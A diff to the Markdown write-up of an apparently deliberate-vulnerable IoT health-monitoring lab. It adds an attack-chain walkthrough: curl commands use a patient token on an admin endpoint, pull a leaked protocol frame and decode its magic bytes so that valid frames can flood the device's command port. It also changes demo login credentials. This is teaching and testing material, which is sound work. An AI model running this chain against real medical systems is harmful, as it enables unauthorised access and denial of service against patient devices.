@@ -108,7 +108,7 @@ curl http://localhost:5002/initialize_iot
 ```bash
 JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
   -H "Content-Type: application/json" \
-  -d '{"username":"patient","password":"patient123"}' \
+  -d '{"username":"john_doe","password":"johnny123"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
 
 echo "$JWT_PATIENT"
@@ -175,6 +175,34 @@ Then verify on the Raspberry Pi:
 ls -la /tmp/patient_pwned
 # File created by patient-owned token via "admin" endpoint
 ```
+
+### Step 4 — Chain: leak the IGP MAGIC, then enable the API4 DoS
+
+In **vulnerable mode** the same threshold call additionally returns the raw IGP
+request frame the Cloud API sent to the device, in the `igp_request` field:
+
+```bash
+curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
+  -H "Content-Type: application/json" \
+  -d '{"bpm_min":50,"bpm_max":120,"spo2_min":90}' \
+  http://localhost:5002/api/config/thresholds | jq -r .igp_request
+# 4341524508000009bb0400320078cc015a
+python3 -c "print(bytes.fromhex('4341524508000009bb0400320078cc015a')[:4])"
+# b'CARE'   ← the IGP protocol MAGIC (0x43415245)
+```
+
+![[api6_chain_api4_hex_string.png]]
+The first 4 bytes decode to the protocol **MAGIC `0x43415245` ("CARE")**, followed by
+the `0x08` command framing. A patient who reached this admin endpoint via the BFLA now
+knows how to build *valid* IGP frames — the prerequisite for the
+[API4 Unrestricted Resource Consumption](API4_Unrestricted_Resource_Consumption.md)
+connection flood of `:9999`. In secure mode (`VULNERABLE=0`) the `igp_request` field is
+omitted (same strip as the `GET_NETWORK` `raw` field).
+
+![[api6_cyberchef_magic_number.png]]
+
+> **Chain:** API6 (BFLA reaches `set_thresholds`) → information disclosure of the IGP
+> request frame → API4 (valid-frame flood of the careservice command channel).
 
 ---
 
@@ -249,3 +277,4 @@ Endpoints that are legitimately accessible to both roles (e.g., `GET /api/vitals
 
 - `CareOtter_Test_Suite.md` §API-06
 - `CareOtter_API.md` Vulnerability Surface #8
+- Chains to `API4_UNrestricted_Resource_Consumption.md` — the leaked MAGIC enables valid IGP frames
